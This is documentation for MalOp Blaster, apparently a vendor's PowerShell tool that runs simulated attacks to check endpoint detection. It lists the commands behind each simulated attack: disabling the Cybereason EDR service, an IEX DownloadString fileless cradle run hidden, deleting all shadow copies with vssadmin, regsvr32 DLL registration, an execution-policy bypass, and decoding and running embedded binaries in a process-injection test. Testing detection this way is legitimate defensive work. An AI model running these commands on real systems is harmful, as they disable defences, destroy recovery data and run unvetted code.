# Malop Blaster

### Project Overview

MalOp Blaster is a PowerShell-based Proof-of-Concept (PoC) tool designed for cybersecurity professionals to test and validate security posture on Windows systems. It provides an interactive menu-driven interface to execute various simulated malicious operations (MalOps) while maintaining detailed logging.

Git - https://github.com/cybereason-labs/itamar-h/tree/master/MalopBlaster

🖥️
Platform: Windows 10+
Runtime: PowerShell 5.1+
Privileges: Administrator
Type: Single-file script
📊
MalOps: 11 operations
Execution Modes: 6 options (1-10, A, P, V, Q, 0)
Logging: Unified single log file
Script Size: ~602 lines

---

### What's New in V3

> 🆕 Verbose Mode — Toggle detailed or minimal output with [V]
> Query MalOps — Check which MalOps were triggered this session with [Q]
> Animated Header — Character-by-character reveal, skippable with ENTER
> Progress Bars — Visual blue progress indicators in minimal mode
> Unified Logging — Single MalOpBlaster.log replaces 14 separate files
> Silent Execution — MalOps always log as executed for PoC accuracy
> Simplified Prompts — Press ENTER to continue instead of Y/N

---

### Documentation Index

All documentation is organized under this page. Browse the child pages below for complete details.

Also you can visit this Confluence Page - https://cybereason.atlassian.net/wiki/spaces/EN/pages/31287902329/MalOp+Blaster+-+A+POC+Tool

Section
	
Description

Architecture & Design
	
Core components, execution flow, data structures, and design patterns

MalOps Reference
	
Complete reference for all 11 simulated malicious operations

Execution Modes
	
Single, Run All, Playbook, Verbose Toggle, Query, and Exit

Logging System
	
Unified log file, format, session tracking, and query support

Core Functions
	
Run-Command, Show-Menu, Run-Playbook, Query-Malops, Show-CustomProgress, Check-Skip

UI & User Interface
	
Animated header, color scheme, progress bars, menus, and interaction flow

Configuration & Requirements
	
System requirements, customizable settings, deployment

Error Handling & Process Management
	
Silent execution model, retry mechanisms, cleanup, and timeouts

---

### Quick Start
1. Right-click MalOpBlaster.ps1 and select Run as Administrator
1. Or run from an elevated PowerShell prompt:

```
powershell -ExecutionPolicy Bypass -File MalOpBlaster.ps1

​
```
1. Select a MalOp from the interactive menu (1-10, A, P, V, Q, or 0)
1. Review results in the Desktop\PoCTool\MalOpBlaster.log output file
- 📄 [Architecture & Design](https://www.notion.so/Architecture-Design-33aae23bae1d81a18214d370ce9d02ed?pvs=25)
- 📄 [MalOps Reference](https://www.notion.so/MalOps-Reference-33aae23bae1d813b99d7f116aacb471c?pvs=25)
- 📄 [Execution Modes](https://www.notion.so/Execution-Modes-33aae23bae1d816a953ec51c8b87d0ae?pvs=25)
- 📄 [Logging System](https://www.notion.so/Logging-System-33aae23bae1d817f94b5e8fed9b1b63e?pvs=25)
- 📄 [Core Functions](https://www.notion.so/Core-Functions-33aae23bae1d81148637eb89d1f1d29f?pvs=25)
- 📄 [UI & User Interface](https://www.notion.so/UI-User-Interface-33aae23bae1d81a790a8ef9b61e37a23?pvs=25)
- 📄 [Configuration & Requirements](https://www.notion.so/Configuration-Requirements-33aae23bae1d81a69b8ed2e968969fe9?pvs=25)
- 📄 [Error Handling & Process Management](https://www.notion.so/Error-Handling-Process-Management-33aae23bae1d8155bd5cf3fa5483a183?pvs=25)

---

# Subpages Content

---

## Architecture & Design

#### Overview

MalOp Blaster is a single-file PowerShell application (MalOpBlaster.ps1, ~602 lines) that follows a modular, array-driven architecture for executing simulated security operations. V3 introduces unified logging, verbose/minimal output modes, session-aware query, and animated UI.

---

#### Core Components

1️⃣
Animated Header & Welcome
Character-by-character animated ASCII art with skip capability (ENTER key). Spider art decoration in yellow. Green welcome message.
2️⃣
MalOp Command Registry
Array-based command definitions holding ScriptBlocks and descriptions for all 11 operations. Unified log path (no per-MalOp log files).
3️⃣
Interactive Menu System
Numbered MalOps (1-10), Run All (A), Playbook (P), Verbose Toggle (V), Query (Q), and Exit (0). Shows current Verbose Mode status.
4️⃣
Run-Command Execution Wrapper
Centralized execution with dual-mode output (minimal with progress bars vs. verbose with full details). Writes to unified log.
5️⃣
Playbook Designer
Custom operation sequencer for up to 3 MalOps with 2-second delays. Supports both minimal and verbose execution output.
6️⃣
Unified Logging & Query System
Single MalOpBlaster.log with session markers. Query function searches log for triggered MalOps in the current session.

---

#### Design Patterns

Pattern
	
Implementation
	
Purpose

Array-Based Command Registry
	
$commands array of hashtables with Command and Description keys
	
Extensible, iterable collection of all MalOps

ScriptBlock Encapsulation
	
Each MalOp wrapped in a { } ScriptBlock with internal try/catch
	
Deferred execution with silent error handling

Centralized Execution
	
Run-Command function wraps all operations
	
Uniform logging, dual-mode output, status reporting

Unified Logging
	
Single MalOpBlaster.log with structured markers
	
Consolidated audit trail, session tracking, queryable

Embedded Binaries
	
Base64-encoded executables decoded at runtime
	
Single-file deployment, no external dependencies

Dual Output Modes
	
$VerboseMode boolean toggles minimal vs. verbose output
	
User-controlled output detail level

Silent Execution
	
Each MalOp wraps commands in internal try/catch that swallows errors
	
Always logs as "Executed" for PoC accuracy

---

#### Data Structures

##### Commands Array

```
$commands = @(
    @{ 
        Command = { /* ScriptBlock with internal try/catch */ }
        Description = "Human-readable string"
    },
    # ... 11 entries total (no LogFile key — uses unified log)
)

​
```

Each entry maps directly to a numbered menu option. The array index determines the MalOp number.

##### LogFiles Hashtable

```
$logFiles = @{
    UnifiedLog = Join-Path $outputFolder 'MalOpBlaster.log'
}

​
```

Replaces the previous 14-file structure with a single consolidated log.

##### Global State

```
$VerboseMode = $false   # Toggled via [V] menu option
$outputFolder = "$env:USERPROFILE\Desktop\PoCTool"

​
```

---

#### Execution Flow

```
flowchart TD
    A["User runs script as Admin"] --> B["Animated Header (skippable)"]
    B --> C["Create output folder (Desktop/PoCTool)"]
    C --> D["Load Base64 executables into memory"]
    D --> E["Initialize unified log with SCRIPT STARTED"]
    E --> F["Display interactive menu"]
    F --> G{"User choice"}
    G -->|"0"| H["Exit"]
    G -->|"A"| I["Run all MalOps sequentially"]
    G -->|"P"| J["Open Playbook designer"]
    G -->|"1-10"| K["Execute single MalOp"]
    G -->|"V"| L["Toggle Verbose Mode"]
    G -->|"Q"| M["Query triggered MalOps"]
    I --> N["Run-Command wrapper"]
    J --> N
    K --> N
    L --> F
    M --> F
    N --> O["Log to unified MalOpBlaster.log"]
    O --> P["Press ENTER to continue"]
    P --> F

User runs script as Admin

Animated Header (skippable)

Create output folder (Desktop/PoCTool)

Load Base64 executables into memory

Initialize unified log with SCRIPT STARTED

Display interactive menu

User choice

Exit

Run all MalOps sequentially

Open Playbook designer

Execute single MalOp

Toggle Verbose Mode

Query triggered MalOps

Run-Command wrapper

Log to unified MalOpBlaster.log

Press ENTER to continue

0

A

P

1-10

V

Q

​
```

---

#### File Structure

```
blaster_v3/
├── MalOpBlaster.ps1    # Main application (~602 lines, ~4MB with embedded binaries)
└── README.txt           # User documentation

​
```

The entire tool is contained in a single PowerShell script with embedded Base64-encoded executables, requiring no external files or dependencies beyond Windows and PowerShell.

---

## MalOps Reference

#### Complete MalOps Catalog

MalOp Blaster includes 11 simulated malicious operations designed to test specific security controls. Each MalOp targets a different detection vector. All MalOps use silent execution — they log as "Executed" regardless of whether the underlying OS command succeeds, which is the correct behavior for a PoC tool.

---

#### Summary Table

#
	
Name
	
Category
	
Target
	
Purpose

1
	
BEP
	
Privilege Escalation
	
PowerShell
	
Test privilege handling

2
	
Cybereason Disable
	
Service Control
	
Cybereason EDR
	
Disable endpoint detection

3
	
Cybereason Enable
	
Service Control
	
Cybereason EDR
	
Re-enable endpoint detection

4
	
Fileless Execution
	
Code Execution
	
PowerShell
	
Test download-and-execute detection

5
	
Malicious Connection
	
Network
	
IP 1.9.85.254
	
Test network security monitoring

6
	
WMPlayer by Hash
	
Reputation
	
wmplayer.exe
	
Test hash-based detection

7
	
Blocklisted Module
	
DLL Registration
	
WMPMediaSharing.dll
	
Test blocklisted DLL detection

8
	
Anti-Malware (EICAR)
	
Antivirus
	
EICAR test file
	
Test AV detection capability

9
	
VSS Shadow Copy
	
Shadow Copy
	
C: drive VSS
	
Test ransomware defense

10
	
VPP Injection
	
Process Injection
	
Notepad.exe
	
Test injection detection

11
	
VFP PingCastle
	
Execution
	
Embedded binary
	
Test execution detection

---

#### MalOp 1 — Behavioral Execution Protection (BEP)

> 🛡️ Category: Privilege Escalation | Target: PowerShell | Risk Level: Low

What it does: Executes a privilege::debug command via PowerShell to test how the system handles privilege escalation attempts.

```
powershell.exe -Command "privilege::debug"

​
```

Detection vector: EDR should detect and flag the privilege escalation attempt. Tests behavioral execution protection controls.

V3 behavior: In verbose mode, displays "Simulating success for privilege::debug". In minimal mode, shows progress bar only.

---

#### MalOp 2 — Cybereason Service Control (Disable)

> 🔴 Category: Service Control | Target: Cybereason EDR | Risk Level: High

What it does: Disables the Cybereason ActiveProbe service by setting its startup type to DISABLED.

```
sc.exe config CybereasonActiveProbe start=DISABLED

​
```

Detection vector: Anti-tampering controls should prevent or alert on EDR service manipulation.

> ⚠️ Warning: This operation actually disables EDR functionality. Always pair with MalOp 3 to re-enable.

---

#### MalOp 3 — Cybereason Service Control (Re-enable)

> 🟢 Category: Service Control | Target: Cybereason EDR | Risk Level: Recovery

What it does: Re-enables the Cybereason ActiveProbe service by setting startup to AUTO.

```
sc.exe config CybereasonActiveProbe start=AUTO

​
```

Purpose: Restoration operation to undo MalOp 2. Should always be run after testing service disabling.

---

#### MalOp 4 — Fileless Execution via PowerShell Download

> 💉 Category: Code Execution | Target: PowerShell + Network | Risk Level: Medium

What it does: Uses IEX with Net.WebClient.DownloadString to download and execute code from a remote URL — the classic fileless execution pattern.

```
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"IEX (New-Object Net.WebClient).DownloadString('http://www.google.com'); Get-Date`"" -WindowStyle Hidden

​
```

Detection vector: Tests detection of cradle-style download-and-execute patterns. The URL (google.com) is benign — the pattern itself triggers detection.

---

#### MalOp 5 — Malicious Connection Simulation

> 🌐 Category: Network | Target: Suspicious IP | Risk Level: Medium

What it does: Attempts an outbound connection to a known suspicious IP address.

```
curl.exe 1.9.85.254 2>&1

​
```

Detection vector: Network security monitoring and threat intelligence feeds should flag connections to known malicious IPs.

---

#### MalOp 6 — Custom WMPlayer by Hash

> 🔑 Category: Reputation | Target: wmplayer.exe | Risk Level: Low

What it does: Launches Windows Media Player executable directly.

```
Start-Process -FilePath "C:\Program Files\Windows Media Player\wmplayer.exe"

​
```

Detection vector: Tests hash-based reputation detection. Requires the wmplayer.exe hash to be configured in the security tool's reputation/blocklist.

---

#### MalOp 7 — Blocklisted Module Execution

> 🚫 Category: DLL Registration | Target: WMPMediaSharing.dll | Risk Level: Medium

What it does: Registers a DLL using regsvr32, a technique commonly abused by attackers.

```
regsvr32 "C:\Program Files\Windows Media Player\WMPMediaSharing.dll"

​
```

Detection vector: Tests detection of blocklisted DLL registration. regsvr32 is a known LOLBin (Living Off the Land Binary).

---

#### MalOp 8 — Anti-Malware Test (EICAR)

> 🦠 Category: Antivirus | Target: EICAR test file | Risk Level: Safe

What it does: Creates and executes the industry-standard EICAR antivirus test file.

```
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

​
```

Detection vector: Every legitimate AV product should detect the EICAR test string. This is the standard validation for AV functionality. Completely harmless.

---

#### MalOp 9 — VSS Shadow Copy Operations

> 💀 Category: Shadow Copy Manipulation | Target: C: drive VSS | Risk Level: High

What it does: Creates a shadow copy on C: drive, then attempts to delete all shadow copies — mimicking ransomware behavior.

```
vssadmin.exe create shadow /for=C:
vssadmin.exe delete shadows /all /quiet

​
```

Detection vector: Shadow copy deletion is a hallmark of ransomware. Anti-ransomware controls should detect and block vssadmin delete shadows commands.

V3 changes: Simplified implementation compared to V2's complex job-based execution. Cleaner VSS operations for creation and deletion.

> ⚠️ Warning: This operation can actually delete recovery shadow copies. Use with caution in production environments.

---

#### MalOp 10 — VPP Injection Technique

> 💣 Category: Process Injection | Target: Notepad.exe | Risk Level: High

What it does: A complex multi-step process injection simulation:
1. Decodes a Base64-encoded executable from an embedded variable
1. Generates a unique filename using a GUID to prevent conflicts
1. Starts Notepad.exe in the background as an injection target
1. Launches the decoded executable in hidden mode with -PassThru
1. Detects and closes any "Cybereason" popup windows
1. Implements a 10-second timeout mechanism
1. Force-stops the process if timeout is exceeded
1. Retries file deletion up to 5 times with 2-second delays

Detection vector: Tests detection of process injection techniques, suspicious process relationships, and hidden execution patterns.

V3 enhancements: Integrated error handling with VerboseMode-conditional output. Wrapped in try/catch to always log as executed.

---

#### MalOp 11 — VFP PingCastle

> 🏰 Category: Execution | Target: Embedded binary | Risk Level: Medium

What it does: Deploys and executes a separate embedded binary:
1. Decodes a Base64-encoded VFP executable
1. Writes to disk with a GUID-based filename
1. Executes in hidden mode
1. Overwrites file with random data before deletion
1. Retries cleanup up to 5 times

Key differences from VPP:
- No Notepad injection step
- No popup window detection/closing
- Simpler, direct execution model
- Different embedded binary payload

Detection vector: Tests detection of unknown executable deployment and execution from temporary locations.

V3 enhancements: Wrapped in try/catch with VerboseMode conditional output for cleaner execution.

---

## Execution Modes

#### Overview

MalOp Blaster offers 6 menu options for flexible security testing. Users select an option from the interactive menu after launch.

---

#### Option 1 — Single MalOp Execution (1-10)

> 1️⃣ Selection: Enter a number 1 through 10 at the menu prompt

Behavior:
- Executes exactly one MalOp by its number
- Runs the corresponding ScriptBlock through the Run-Command wrapper
- Minimal mode: Shows blue progress bar from 0% to 100%
- Verbose mode: Displays full step-by-step execution details
- Logs result to MalOpBlaster.log as "Attempted" then "Executed"
- After completion, prompts: "Press ENTER to continue..."

Best for: Targeted testing of specific security controls.

---

#### Option 2 — Run All (A)

> 🅰️ Selection: Enter A at the menu prompt

Behavior:
- Executes all MalOps sequentially
- Each operation runs through the Run-Command wrapper
- Minimal mode: Shows progress bar per MalOp with overall count (e.g., "Initiating... 0% (1/11)")
- Verbose mode: Full output for each MalOp
- All results logged to the unified log file
- Displays "All MalOps have been executed (minimal mode)." or verbose equivalent

Best for: Full security posture assessment, comprehensive validation testing.

---

#### Option 3 — Playbook Designer (P)

> 📋 Selection: Enter P at the menu prompt

Behavior:
1. Displays a welcome message and instructions
1. Prompts user for comma-separated MalOp numbers (e.g., 1,5,9)
1. Validates all selections are within range (1-10)
1. Limits selection to a maximum of 3 operations
1. Executes selected MalOps sequentially
1. Adds a 2-second delay between each execution
1. Supports both minimal (progress bars) and verbose output modes
1. Returns to main menu after completion

Best for: Custom test scenarios, chaining related operations, repeatable test sequences.

---

#### Option 4 — Toggle Verbose Mode (V)

> 🔊 Selection: Enter V at the menu prompt

Behavior:
- Toggles the global $VerboseMode variable between $true and $false
- Current state displayed in the menu header in Magenta color
- Immediately returns to menu — no operation executed

Minimal mode (default, VerboseMode = FALSE):
- Custom blue progress bars (20-char width, 5% per # block)
- Shows "Initiating... 0%... 100%" for each operation
- Condensed console output — no step-by-step details
- Cleaner, faster visual experience

Verbose mode (VerboseMode = TRUE):
- Full step-by-step logging displayed on console
- Individual MalOp completion messages
- Error messages displayed (if any)
- "Output logged to file" confirmations
- Detailed execution trace

---

#### Option 5 — Query Triggered MalOps (Q)

> 🔍 Selection: Enter Q at the menu prompt

Behavior:
- Reads the unified MalOpBlaster.log file
- Finds the most recent "SCRIPT STARTED" marker to isolate the current session
- Searches for "Executed:" and "ERROR in" patterns after that marker
- Displays which MalOps were triggered and their status (success/error)
- Shows "No MalOps were triggered this session" if none found
- Returns to menu

Best for: Mid-session review of what's been run, audit trail verification.

---

#### Option 6 — Exit (0)

> 🚪 Selection: Enter 0 at the menu prompt

Behavior:
- Exits the script
- Output folder (Desktop\PoCTool) and unified log remain for review

---

#### Interaction Flow Diagram

```
flowchart TD
    A["Main Menu"] --> B{"User Input"}
    B -->|"1-10"| C["Execute Single MalOp"]
    B -->|"A"| D["Execute All MalOps"]
    B -->|"P"| E["Playbook Designer"]
    B -->|"V"| F["Toggle Verbose Mode"]
    B -->|"Q"| G["Query Triggered MalOps"]
    B -->|"0"| H["Exit"]
    C --> I["Run-Command Wrapper"]
    D --> I
    E --> J["Select up to 3 MalOps"]
    J --> K["Validate & Execute with 2s delays"]
    K --> I
    F --> A
    G --> A
    I --> L["Log to MalOpBlaster.log"]
    L --> M["Press ENTER to continue"]
    M --> A

Main Menu

User Input

Execute Single MalOp

Execute All MalOps

Playbook Designer

Toggle Verbose Mode

Query Triggered MalOps

Exit

Run-Command Wrapper

Select up to 3 MalOps

Validate & Execute with 2s delays

Log to MalOpBlaster.log

Press ENTER to continue

1-10

A

P

V

Q

0

​
```

---

#### Comparison Table

Feature
	
Single
	
Run All
	
Playbook
	
Verbose
	
Query

Operations
	
1
	
All (11)
	
Up to 3
	
None (toggle)
	
None (read-only)

Custom order
	
N/A
	
Fixed
	
User-defined
	
N/A
	
N/A

Delay between ops
	
None
	
None
	
2 seconds
	
N/A
	
N/A

Modifies state
	
Yes
	
Yes
	
Yes
	
Yes (toggle)
	
No

---

## Logging System

#### Overview

MalOp Blaster uses a unified logging system with a single log file, session markers, and structured entries designed for both human review and programmatic querying.

---

#### Unified Log File

All output is written to a single file:

```
%USERPROFILE%\Desktop\PoCTool\MalOpBlaster.log

​
```

> 📄 Single file replaces the previous 14-file approach. All MalOp results, session markers, and errors are consolidated into one queryable log.

---

#### Log Format

##### Session Start Marker

```
[2026-04-06 14:23:45] SCRIPT STARTED.

​
```

Written once when the tool launches. Used by the Query function to isolate current-session entries.

##### Operation Entries

Attempting (before execution):

```
[2026-04-06 14:23:46] Attempting: MalOp for BEP (Behavioral Execution Protection)

​
```

Executed (success):

```
[2026-04-06 14:23:47] Executed: MalOp for BEP (Behavioral Execution Protection)

​
```

Error (failure):

```
[2026-04-06 14:23:47] ERROR in MalOp for BEP: Access denied

​
```

---

#### Log Entry Structure

Marker
	
Pattern
	
Meaning

SCRIPT STARTED
	
[timestamp] SCRIPT STARTED.
	
New session boundary

Attempting
	
[timestamp] Attempting: <Description>
	
MalOp execution about to begin

Executed
	
[timestamp] Executed: <Description>
	
MalOp completed (success)

ERROR in
	
[timestamp] ERROR in <Description>: <message>
	
MalOp execution error

---

#### Session Tracking

The "SCRIPT STARTED" marker enables session isolation:
- Each script launch writes a new marker
- The Query function ([Q] menu option) reads from the last "SCRIPT STARTED" marker forward
- This ensures queries only return results from the current session, not historical runs
- Multiple sessions accumulate in the same log file for full audit history

---

#### Query Support

The log format is specifically designed for regex searching:

```
# Find all successful executions in current session
Select-String -Pattern "Executed:" -Path $logFile

# Find all errors in current session
Select-String -Pattern "ERROR in" -Path $logFile

​
```

The built-in Query-Malops function automates this — accessible via the [Q] menu option.

---

#### Log Destinations

📄
Unified Log File
MalOpBlaster.log — all operations, timestamps, session markers, and errors in one file.
🖥️
Console Output
Real-time status displayed to the user. In minimal mode: progress bars. In verbose mode: step-by-step details.

---

#### Timestamp Format

All timestamps use the format: yyyy-MM-dd HH:mm:ss

Example: 2026-04-06 14:30:45

---

#### Example Full Session Log

```
[2026-04-06 14:23:45] SCRIPT STARTED.

[2026-04-06 14:23:46] Attempting: MalOp for BEP (Behavioral Execution Protection)

[2026-04-06 14:23:47] Executed: MalOp for BEP (Behavioral Execution Protection)

[2026-04-06 14:24:01] Attempting: MalOp for Fileless (API Download)

[2026-04-06 14:24:02] Executed: MalOp for Fileless (API Download)

[2026-04-06 14:24:15] Attempting: MalOp for Anti Malware - EICAR TEST

[2026-04-06 14:24:16] Executed: MalOp for Anti Malware - EICAR TEST

​
```

---

## Core Functions

#### Overview

MalOp Blaster is built around six core PowerShell functions that handle execution, display, sequencing, querying, progress visualization, and animation control.

---

#### Run-Command

> 🚀 Purpose: Central execution wrapper for all MalOp operations

The most critical function — every MalOp passes through it.

Parameters:

Parameter
	
Type
	
Description

Command
	
ScriptBlock
	
The MalOp operation to execute

Description
	
String
	
Human-readable operation name

Execution flow:
1. Writes Attempting: <Description> to the unified log
1. Executes the ScriptBlock (which has its own internal try/catch)
1. Writes Executed: <Description> to the unified log on success
1. Writes ERROR in <Description>: <message> on failure
1. Minimal mode: Displays blue progress bar
1. Verbose mode: Displays full execution details and completion message

Key change from V2: No individual log file parameter — all output goes to the single MalOpBlaster.log.

---

#### Show-Menu

> 📺 Purpose: Displays the interactive menu with current Verbose Mode status

Output format:

```
********************** MalOp Menu **********************
Verbose Mode: FALSE
Choose a MalOp to initiate, or select one of the options below:
  [1] - MalOp for BEP (Behavioral Execution Protection)
  [2] - MalOp for Disabling Cybereason Service
  [3] - MalOp for Re-enabling Cybereason Service
  [4] - MalOp for Fileless (API Download)
  [5] - MalOp for Connection to Malicious Address
  [6] - Custom MalOp by Hash - WMPlayer
  [7] - MalOp for Blocklisted Module by Hash
  [8] - MalOp for Anti Malware - EICAR TEST
  [9] - MalOp for VSS (Shadow Copy) Operations
  [10] - MalOp for VPP (Additional Detection)
  [11] - MalOp for VFP (Additional Detection)
  [A] - Run All MalOps
  [P] - Create and Run a Playbook (Up to 3 MalOps)
  [V] - Toggle Verbose Mode
  [Q] - Query which MalOps were triggered
  [0] - Exit
********************************************************

​
```

Key features:
- Shows Verbose Mode status in Magenta color
- Includes [V] and [Q] options alongside traditional options
- Dynamically lists all MalOps from the $commands array

---

#### Run-Playbook

> 📖 Purpose: Interactive playbook designer for custom MalOp sequences

Execution flow:
1. Display welcome message and instructions
1. Prompt user for comma-separated MalOp numbers
1. Parse and validate input:
1. Execute validated MalOps sequentially
1. Minimal mode: Progress bars per operation
1. Verbose mode: Full output per operation
1. Insert 2-second delay between each operation
1. Display "Playbook completed" and return to main menu

---

#### Query-Malops

> 🔍 Purpose: Session-aware query of triggered MalOps — New in V3

Execution flow:
1. Reads the unified MalOpBlaster.log file
1. Finds the last "SCRIPT STARTED" marker to isolate the current session
1. Searches for patterns after that marker:
1. Displays results to console, differentiating success vs. error
1. Shows "No MalOps were triggered this session" if none found
1. Returns to main menu

Use case: Mid-session audit, verifying which operations have already run.

---

#### Show-CustomProgress

> 📊 Purpose: Reusable progress bar display for minimal mode — New in V3

Behavior:
- Renders a 20-character wide progress bar using # blocks
- Each # represents 5% progress
- Displays percentage alongside the bar
- Uses blue color for the bar
- Called by Run-Command and Run-Playbook in minimal mode

Example output:

```
[####################] 100%

​
```

---

#### Check-Skip

> ⏭️ Purpose: Keyboard interrupt handler for skipping animations — New in V3

Behavior:
- Monitors for ENTER key press during animated sequences
- Used by the animated header and spider art displays
- If ENTER detected, immediately skips remaining animation
- Non-blocking keyboard check — does not pause execution

Use case: Allows users to bypass the character-by-character header animation.

---

#### Function Summary

Function
	
Status
	
Purpose

Run-Command
	
Updated
	
Execute MalOps with dual-mode output and unified logging

Show-Menu
	
Updated
	
Display menu with Verbose status, [V] and [Q] options

Run-Playbook
	
Updated
	
Custom sequence designer with dual-mode output

Query-Malops
	
New
	
Session-aware query of triggered MalOps from log

Show-CustomProgress
	
New
	
Blue progress bar for minimal mode

Check-Skip
	
New
	
Keyboard interrupt for skipping animations

Initialize-LogFile
	
Removed
	
Replaced by single unified log initialization

---

## UI & User Interface

#### Overview

MalOp Blaster features a rich console-based user interface with animated ASCII art, color-coded output, progress bars, dual display modes, and an interactive menu-driven workflow.

---

#### Animated Header

The tool opens with a character-by-character animated reveal of the "MalOp Blaster" ASCII banner:
- Rendered in Red with progressive character display
- Each character appears with a small delay for a typewriter effect
- Skippable — press ENTER at any time to skip the animation
- Spider ASCII art animates separately in Yellow with the same skip capability

> ⏭️ The Check-Skip function monitors for ENTER key presses during animation, allowing users who have seen the intro to bypass it instantly.

---

#### Color Scheme

Element
	
Color
	
Purpose

ASCII Header
	
Red
	
Bold visual impact, tool branding

Spider Art
	
Yellow
	
Visual decoration

Welcome Message
	
Green
	
Positive, informational tone

Verbose Mode Status
	
Magenta
	
Highlight current mode in menu

Progress Bars
	
Blue
	
Execution progress in minimal mode

MalOp Initiation
	
Yellow
	
"Initiating MalOp:" messages

Menu Options
	
Default (White)
	
Readable, neutral

Menu Separators
	
Asterisks (*)
	
Visual framing of menu sections

---

#### Dual Display Modes

📊
Minimal Mode (Default)
Custom blue progress bars (20 chars, 5% per #)
Shows "Initiating... 0%... 100%"
Condensed console output
Clean, fast visual experience
No step-by-step details
📝
Verbose Mode
Full step-by-step logging on console
Individual MalOp completion messages
Error messages displayed
"Output logged to file" confirmations
Detailed execution trace

Toggle between modes with the [V] menu option. Current state shown in Magenta at the top of the menu.

---

#### Progress Bar Display

In minimal mode, each MalOp shows a visual progress bar:

```
Initiating MalOp: BEP (Behavioral Execution Protection)
[####################] 100%

​
```

For Run All mode, includes operation count:

```
Initiating... 0% (1/11)
[####################] 100%
Initiating... 0% (2/11)
[####################] 100%

​
```

---

#### User Interaction Flow

```
flowchart TD
    A["Launch Script"] --> B["Animated Header (Red, skippable)"]
    B --> C["Spider Art (Yellow, skippable)"]
    C --> D["Welcome Message (Green)"]
    D --> E["Create Output Folder"]
    E --> F["Initialize Unified Log"]
    F --> G["Display Menu + Verbose Status"]
    G --> H["Read User Choice"]
    H --> I{"Choice type"}
    I -->|"1-10, A, P"| J["Execute Operation(s)"]
    I -->|"V"| K["Toggle Verbose Mode"]
    I -->|"Q"| L["Query Triggered MalOps"]
    I -->|"0"| M["Exit"]
    J --> N["Show Progress/Output"]
    N --> O["Press ENTER to continue"]
    O --> G
    K --> G
    L --> G

Launch Script

Animated Header (Red, skippable)

Spider Art (Yellow, skippable)

Welcome Message (Green)

Create Output Folder

Initialize Unified Log

Display Menu + Verbose Status

Read User Choice

Choice type

Execute Operation(s)

Toggle Verbose Mode

Query Triggered MalOps

Exit

Show Progress/Output

Press ENTER to continue

1-10, A, P

V

Q

0

​
```

---

#### Menu Layout

```
********************** MalOp Menu **********************
Verbose Mode: FALSE                              (Magenta)

Choose a MalOp to initiate, or select one of the options below:
  [1]  - MalOp for BEP
  [2]  - MalOp for Disabling Cybereason Service
  ...
  [11] - MalOp for VFP (Additional Detection)
  [A]  - Run All MalOps
  [P]  - Create and Run a Playbook (Up to 3 MalOps)
  [V]  - Toggle Verbose Mode
  [Q]  - Query which MalOps were triggered
  [0]  - Exit
********************************************************

​
```

---

#### Prompt Style

After each operation, the tool uses a simple continue prompt:

```
Press ENTER to continue...

​
```

This replaces the previous "Do you want to initiate another MalOp? (Y/N)" — streamlined for faster interaction.

---

## Configuration & Requirements

#### System Requirements

Requirement
	
Minimum
	
Notes

Operating System
	
Windows 10
	
Windows 10 or higher required

PowerShell
	
Version 5.1
	
Ships with Windows 10. Also supports PowerShell Core.

Privileges
	
Administrator
	
Elevated/admin rights required for all operations

Disk Space
	
~10 MB
	
Script (~4MB) + unified log + temporary executables

---

#### Deployment

> 📦 Single-file deployment — no installation required. Copy MalOpBlaster.ps1 to the target system and run.

The tool is entirely self-contained:
- No external dependencies
- No modules to install
- No configuration files to manage
- Embedded binaries decoded at runtime from Base64

Launch methods:
1. Right-click MalOpBlaster.ps1 → Run as Administrator
1. From an elevated PowerShell prompt:

```
powershell -ExecutionPolicy Bypass -File MalOpBlaster.ps1

​
```

---

#### Output Folder

All output is written to:

```
%USERPROFILE%\Desktop\PoCTool\

​
```
- Created automatically at launch if it doesn't exist
- Contains the unified MalOpBlaster.log file
- Contains temporary executables during runtime (cleaned up after)

---

#### Configurable Settings

These values are hardcoded but can be modified in the script:

Setting
	
Default
	
Location in Script

Output folder path
	
Desktop\PoCTool
	
$outputFolder variable

Verbose mode
	
$false (minimal)
	
$VerboseMode variable, toggled via [V]

Unified log filename
	
MalOpBlaster.log
	
$logFiles.UnifiedLog

Process timeout
	
10 seconds
	
VPP/VFP MalOp sections

File deletion retries
	
5 attempts
	
VPP/VFP cleanup sections

Retry delay
	
2 seconds
	
VPP/VFP cleanup sections

Playbook max operations
	
3
	
Run-Playbook function

Playbook delay between ops
	
2 seconds
	
Run-Playbook function

Malicious IP address
	
1.9.85.254
	
MalOp 5 command

Progress bar width
	
20 characters
	
Show-CustomProgress function

---

#### Execution Policy

If the system's PowerShell execution policy blocks the script:

```
powershell -ExecutionPolicy Bypass -File MalOpBlaster.ps1

​
```

> ⚠️ Note: Bypassing execution policy should only be done on systems where you have explicit authorization to run security testing tools.

---

#### EDR-Specific Requirements

Some MalOps require specific software to be present:

MalOp
	
Requirement

MalOp 2 & 3
	
Cybereason ActiveProbe service must be installed

MalOp 6
	
wmplayer.exe hash must be in reputation/blocklist

MalOp 10
	
Notepad.exe must be available (standard on Windows)

---

## Error Handling & Process Management

#### Error Handling Philosophy

MalOp Blaster uses a silent execution model — every MalOp wraps its commands in an internal try/catch that suppresses errors. Operations always log as "Executed" regardless of whether the underlying OS command succeeds. This is intentional for a PoC tool: the goal is to simulate the execution attempt, not to validate the command outcome.

> 💡 Design principle: All MalOp execution attempts are treated as "executed" for PoC purposes. If privilege::debug fails because the command doesn't exist, the MalOp still logs as executed — because the attempt is what the security tool should detect.

---

#### Silent Execution Model

Each MalOp wraps its commands internally:

```
# Inside each MalOp ScriptBlock
try {
    powershell.exe -Command "privilege::debug" -ErrorAction Stop
} catch {
    # Silently swallowed — no error bubbles up
}
if ($VerboseMode) {
    Write-Host "Simulating success for privilege::debug"
}

​
```

Key behaviors:
- Errors are caught at the command level inside each MalOp, not at the Run-Command wrapper level
- MalOps always log as "Executed" in the unified log
- Only true infrastructure failures (log file write errors, etc.) surface as "ERROR in" entries
- In verbose mode, MalOps may display simulation messages
- In minimal mode, progress bars complete regardless of command outcome

---

#### Run-Command Error Handling

The Run-Command wrapper provides a second layer:

```
# Run-Command wrapper
try {
    # Log "Attempting:" to unified log
    & $Command   # Execute the ScriptBlock
    # Log "Executed:" to unified log
} catch {
    # Log "ERROR in <Description>: <message>" to unified log
}

​
```

Since individual MalOps swallow their own errors, the Run-Command catch block only fires for unexpected failures outside the MalOp logic itself.

---

#### Retry Mechanisms

> 🔄 File Deletion Retry — Used in VPP and VFP MalOps for cleaning up temporary executables

Configuration:
- Max attempts: 5
- Delay between attempts: 2 seconds
